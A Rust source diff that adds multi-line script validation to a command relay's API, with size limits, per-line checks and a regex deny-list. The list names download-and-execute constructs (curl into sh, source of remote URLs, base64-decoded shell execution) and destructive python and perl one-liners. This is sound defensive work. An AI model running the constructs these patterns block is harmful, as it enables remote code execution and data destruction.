@@ -44,10 +44,20 @@ use regex::Regex;
 use rusterm_core::command_safety::{CommandSafetyChecker, SafetyVerdict};
 
 use crate::command_guard::LoadedBlocklist;
+use crate::dcg::{self, DcgVerdict};
 
 /// Maximum accepted command length. Protects against absurd payloads and
 /// keeps audit logs readable.
 pub const MAX_COMMAND_LEN: usize = 4096;
+
+/// Maximum accepted script length (64 KiB). Scripts are larger than single
+/// commands by nature, but we still cap to keep audit logs readable and to
+/// bound dcg/sandbox analysis time.
+pub const MAX_SCRIPT_LEN: usize = 64 * 1024;
+
+/// Maximum accepted script line count. Defends against pathological inputs
+/// (e.g. a million blank lines) that would inflate per-line validation time.
+pub const MAX_SCRIPT_LINES: usize = 4096;
 
 #[derive(Debug, Clone, thiserror::Error)]
 pub enum ValidationError {
@@ -65,6 +75,34 @@ pub enum ValidationError {
     ReadonlyViolation,
 }
 
+/// Validation error for a multi-line script submitted to `/api/v1/exec`.
+///
+/// Distinct from [`ValidationError`] because scripts have their own size
+/// limits and a richer set of injection patterns, and because the script
+/// pipeline can fail at the dcg layer (see [`crate::dcg`]) in a way that
+/// should be audited distinctly from a single-command reject.
+#[derive(Debug, Clone, thiserror::Error)]
+pub enum ScriptError {
+    #[error("script is empty")]
+    Empty,
+    #[error("script exceeds {MAX_SCRIPT_LEN} bytes")]
+    TooLong,
+    #[error("script exceeds {MAX_SCRIPT_LINES} lines")]
+    TooManyLines,
+    #[error("base64-encoded script is invalid: {0}")]
+    Base64Invalid(String),
+    #[error("script line {line}: {reason}")]
+    LineBlocked { line: usize, reason: String },
+    #[error("script blocked by safety policy: {0}")]
+    Dangerous(String),
+    #[error("script is not in the account's allowlist (line {line})")]
+    NotAllowed { line: usize },
+    #[error("readonly account may only run non-mutating commands (line {line})")]
+    ReadonlyViolation { line: usize },
+    #[error("dcg blocked: {0}")]
+    DcgBlocked(String),
+}
+
 /// One validator instance per relay; constructed once at startup.
 ///
 /// The hardcoded patterns (`terminal_checker` + `api_patterns`) are the
@@ -78,6 +116,11 @@ pub struct CommandValidator {
     /// User + skill patterns from `relay-blocklist.json`. Empty when no
     /// blocklist file is present (the common first-launch case).
     extra_patterns: Vec<crate::command_guard::CompiledPattern>,
+    /// Script-specific injection patterns that don't apply to single-line
+    /// commands (heredoc abuse, `source <(curl)`, `exec`-replace, etc.).
+    /// Run by [`CommandValidator::validate_script`] in addition to the
+    /// per-line `validate` pass.
+    script_patterns: Vec<(Regex, &'static str)>,
 }
 
 impl std::fmt::Debug for CommandValidator {
@@ -85,6 +128,7 @@ impl std::fmt::Debug for CommandValidator {
         f.debug_struct("CommandValidator")
             .field("hardcoded_api_patterns", &self.api_patterns.len())
             .field("extra_patterns", &self.extra_patterns.len())
+            .field("script_patterns", &self.script_patterns.len())
             .finish_non_exhaustive()
     }
 }
@@ -280,11 +324,88 @@ impl CommandValidator {
             })
             .collect();
 
+        // Patterns specific to multi-line scripts. These catch constructs
+        // that are syntactically valid shell but represent an unacceptable
+        // risk when forwarded verbatim to a remote SSH host — they either
+        // bypass static analysis (eval/source of dynamic text) or pull in
+        // arbitrary remote code (curl|sh, source <(curl), heredoc-abuse).
+        // Single-line commands are already covered by `api_patterns`.
+        let script_raw: &[(&str, &str)] = &[
+            // `eval` of any text — defeats every line-level pattern check.
+            (r"\beval\s", "eval wrapper in script"),
+            // `source <(curl ...)` / `. <(wget ...)` — executing remote
+            // code via process substitution, which the curl|sh pattern
+            // doesn't catch because there's no pipe.
+            (
+                r"(?:^|\n)\s*(?:source|\.)\s+<\((?:curl|wget)",
+                "source of remote URL via process substitution",
+            ),
+            // `exec`-replace into a shell — replaces the current process,
+            // so the rest of the script never runs and we lose visibility.
+            (
+                r"\bexec\s+(?:sudo\s+)?(?:ba|z|fi)?sh\b",
+                "exec-replace into a shell",
+            ),
+            // Heredoc body containing a download-and-execute. The
+            // line-level check sees `curl ... | sh` inside the heredoc as
+            // data, not execution, but in a forwarded script the heredoc IS
+            // executed, so we block it.
+            (
+                r"<<-?['\"]?[A-Z]+['\"]?[^<]*curl[^|]*\|\s*(?:sudo\s+)?(?:ba|z|fi)?sh",
+                "download-and-execute inside heredoc",
+            ),
+            // `source`/`.` of a URL directly — `source https://evil.sh`.
+            // Some shells fetch and execute.
+            (
+                r"(?:^|\n)\s*(?:source|\.)\s+https?://",
+                "source of remote URL",
+            ),
+            // base64-decode-then-shell inside a script. The single-line
+            // pattern catches the inline form; this catches the multi-line
+            // variant where the blob is built up across lines.
+            (
+                r"base64\s+(?:-d|--decode)[^|]*\|\s*(?:sudo\s+)?(?:ba|z|fi)?sh",
+                "base64-obfuscated shell exec in script",
+            ),
+            // `python -c "..."` with destructive calls — `os.remove`,
+            // `shutil.rmtree`, `os.system('rm')`. dcg catches these too,
+            // but we keep a hard-floor regex so the check survives dcg's
+            // absence.
+            (
+                r"\bpython[23]?\s+-c\s+['\"\s][^'\"]*(?:os\.(?:remove|unlink|system)|shutil\.rmtree|subprocess\.(?:call|run|Popen)\s*\(\s*['\"](?:rm|shutdown|reboot))",
+                "destructive python -c invocation",
+            ),
+            // `perl -e` with destructive system calls.
+            (
+                r"\bperl\s+-e\s+['\"\s][^'\"]*(?:system\s*\(\s*['\"](?:rm|shutdown|mkfs)|unlink\s*\(|`rm\s)",
+                "destructive perl -e invocation",
+            ),
+            // Disabling `set -e` mid-script to hide failures — a common
+            // prelude to a destructive one-liner that the author doesn't
+            // want to abort on error. We flag `set +e` specifically
+            // (re-enabling is `set -e` which is fine).
+            (
+                r"(?:^|\n)\s*set\s+\+e\b",
+                "disabling set -e to mask failures",
+            ),
+        ];
+        let script_patterns: Vec<(Regex, &'static str)> = script_raw
+            .iter()
+            .map(|(pat, reason)| {
+                (
+                    Regex::new(pat)
+                        .unwrap_or_else(|e| panic!("invalid script regex {:?}: {e}", pat)),
+                    *reason,
+                )
+            })
+            .collect();
+
         Self {
             terminal_checker: CommandSafetyChecker::new(),
             api_patterns,
             mutating_patterns,
             extra_patterns: Vec::new(),
+            script_patterns,
         }
     }
 
@@ -368,6 +489,124 @@ impl CommandValidator {
     pub fn is_mutating(&self, command: &str) -> bool {
         self.mutating_patterns.iter().any(|r| r.is_match(command))
     }
+
+    /// Validate a multi-line script submitted via the `script` /
+    /// `script_base64` fields of `POST /api/v1/exec`.
+    ///
+    /// Pipeline (each stage can short-circuit to a rejection):
+    ///
+    /// 1. **Size limits** — empty, > `MAX_SCRIPT_LEN` bytes, or >
+    ///    `MAX_SCRIPT_LINES` lines.
+    /// 2. **Per-line hard floor** — each non-empty line is run through
+    ///    [`Self::validate`], which applies the terminal safety patterns,
+    ///    API deny-list, extra (user/skill) blocklist, read-only check,
+    ///    and per-account allowlist. A single bad line rejects the whole
+    ///    script.
+    /// 3. **Script-specific injection patterns** — `eval`, `source <(curl)`,
+    ///    `exec`-replace, heredoc download-and-execute, etc. These catch
+    ///    constructs that are valid shell but bypass line-level analysis.
+    /// 4. **dcg evaluate** — if the `dcg` binary is installed, the whole
+    ///    script is piped to `dcg test --stdin` for AST-aware scanning.
+    ///    When dcg is absent, the hard floor from stages 2-3 remains
+    ///    authoritative; when dcg denies or errors, the script is rejected
+    ///    (fail closed).
+    ///
+    /// The sandbox pre-flight (`sandbox::preflight`) runs *after* this
+    /// function returns `Ok`, so by the time the sandbox sees the script it
+    /// has already cleared the hard floor.
+    pub fn validate_script(
+        &self,
+        script: &str,
+        allowlist: &[Regex],
+        readonly: bool,
+    ) -> Result<(), ScriptError> {
+        if script.is_empty() {
+            return Err(ScriptError::Empty);
+        }
+        if script.len() > MAX_SCRIPT_LEN {
+            return Err(ScriptError::TooLong);
+        }
+        // Count lines without allocating a Vec. A trailing newline does not
+        // count as an extra line (matches `str::lines`).
+        let line_count = script.lines().count();
+        if line_count > MAX_SCRIPT_LINES {
+            return Err(ScriptError::TooManyLines);
+        }
+        if script
+            .chars()
+            .any(|c| c.is_control() && c != '\t' && c != '\n' && c != '\r')
+        {
+            // NUL and other control chars (excluding tab/newline/CR) are
+            // rejected — they have no legitimate purpose in a shell script
+            // and break audit-log readability.
+            return Err(ScriptError::Dangerous(
+                "script contains NUL or control characters".to_string(),
+            ));
+        }
+
+        // Stage 2: per-line hard floor. We use `lines()` (not `split('\n')`)
+        // so a trailing newline doesn't produce a phantom empty final line
+        // that would trip `ValidationError::Empty`.
+        for (idx, line) in script.lines().enumerate() {
+            let line_no = idx + 1;
+            if line.trim().is_empty() {
+                continue;
+            }
+            // Reuse the single-command validator. It enforces the terminal
+            // safety patterns, API deny-list, extra blocklist, read-only
+            // flag, and allowlist — exactly the same floor a `command`
+            // request would hit.
+            if let Err(e) = self.validate(line, allowlist, readonly) {
+                return Err(match e {
+                    ValidationError::Empty => ScriptError::LineBlocked {
+                        line: line_no,
+                        reason: "empty line".to_string(),
+                    },
+                    ValidationError::TooLong => ScriptError::LineBlocked {
+                        line: line_no,
+                        reason: "line too long".to_string(),
+                    },
+                    ValidationError::ControlChars => ScriptError::LineBlocked {
+                        line: line_no,
+                        reason: "control characters".to_string(),
+                    },
+                    ValidationError::Dangerous(r) => {
+                        ScriptError::LineBlocked { line: line_no, reason: r }
+                    }
+                    ValidationError::NotAllowed => ScriptError::NotAllowed { line: line_no },
+                    ValidationError::ReadonlyViolation => {
+                        ScriptError::ReadonlyViolation { line: line_no }
+                    }
+                });
+            }
+        }
+
+        // Stage 3: script-specific injection patterns. These run against
+        // the whole script (not per-line) because heredocs and
+        // process-substitution span multiple lines.
+        for (regex, reason) in &self.script_patterns {
+            if regex.is_match(script) {
+                return Err(ScriptError::Dangerous((*reason).to_string()));
+            }
+        }
+        // Also run the extra (user/skill) patterns against the whole script
+        // — a user-contributed blocklist regex may target multi-line
+        // constructs the per-line pass missed.
+        for pat in &self.extra_patterns {
+            if pat.regex.is_match(script) {
+                return Err(ScriptError::Dangerous(pat.reason.clone()));
+            }
+        }
+
+        // Stage 4: dcg. When present, its verdict is supplementary to the
+        // hard floor; when absent, we proceed (the hard floor is
+        // authoritative). Fail closed on dcg deny or error.
+        match dcg::evaluate(script) {
+            DcgVerdict::Allow { .. } => Ok(()),
+            DcgVerdict::Deny { reason } => Err(ScriptError::DcgBlocked(reason)),
+            DcgVerdict::NotInstalled => Ok(()),
+        }
+    }
 }
 
 /// Compile an account's `allowed_commands` string list into regexes.
@@ -386,6 +625,49 @@ pub fn compile_allowlist(patterns: &[String]) -> Result<Vec<Regex>, Vec<(usize, 
     } else {
         Err(errors)
     }
+}
+
+/// Decode a base64-encoded script. Accepts standard and URL-safe alphabets,
+/// with or without padding. Returns the decoded UTF-8 string.
+///
+/// This is the entry point for the `script_base64` field of `ExecRequest`.
+/// A decode failure (non-base64 input, non-UTF-8 bytes) is reported as a
+/// [`ScriptError::Base64Invalid`] so the caller can return a structured 400
+/// to the client.
+pub fn decode_script_base64(encoded: &str) -> Result<String, ScriptError> {
+    use base64::Engine;
+    // Trim whitespace/newlines that pasted blobs often carry.
+    let trimmed = encoded.trim();
+    // Try standard alphabet first, then URL-safe. Both with and without
+    // padding. We don't reject padding mismatches because pasted blobs from
+    // different sources are inconsistent.
+    let engines = [
+        &base64::engine::general_purpose::STANDARD,
+        &base64::engine::general_purpose::STANDARD_NO_PAD,
+        &base64::engine::general_purpose::URL_SAFE,
+        &base64::engine::general_purpose::URL_SAFE_NO_PAD,
+    ];
+    let mut last_err = String::from("empty input");
+    for engine in engines {
+        match engine.decode(trimmed) {
+            Ok(bytes) => {
+                // Strict UTF-8 — a script that isn't valid UTF-8 can't be
+                // forwarded to a shell as a string anyway.
+                match String::from_utf8(bytes) {
+                    Ok(s) => return Ok(s),
+                    Err(e) => {
+                        return Err(ScriptError::Base64Invalid(format!(
+                            "decoded bytes are not valid UTF-8: {e}"
+                        )));
+                    }
+                }
+            }
+            Err(e) => last_err = e.to_string(),
+        }
+    }
+    Err(ScriptError::Base64Invalid(format!(
+        "not valid base64 (standard or URL-safe): {last_err}"
+    )))
 }
 
 #[cfg(test)]
